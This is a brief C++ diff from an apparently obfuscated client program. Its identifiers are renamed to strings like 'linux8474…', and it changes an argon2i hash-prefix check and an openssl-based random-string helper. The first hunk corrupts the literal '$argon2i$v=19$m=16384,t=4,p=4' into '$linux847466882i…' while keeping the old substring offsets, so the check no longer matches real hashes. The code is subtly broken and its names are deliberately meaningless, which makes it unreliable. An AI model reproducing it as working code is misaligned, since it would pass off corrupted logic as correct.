@@ -999,7 +999,7 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     result.success = false;
     
     string linux84746688_data;
-    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
+    if(linux8412.find("$linux847466882i$v=19$m=16384,t=4,p=4") == 0)
         linux84746688_data = linux8412.substr(29);
     else
         linux84746688_data = linux8412.substr(30);
@@ -10763,7 +10763,7 @@ bool linux8474::_should_pause() {
 
 string linux8474::__make_linux88887474447412744474() {
 
-return GetStdoutFromCommand8474("openssl rand -base64 32 | sed s/[^a-zA-Z0-9]//g | tr -d '\t\n\r'");
+return GetStdoutFromCommand8474("openssl rand -base64 32 | sed s/[^a-zA-Z0-9]//g | tr -d '\\t\\n\\r'");
 
 }
 
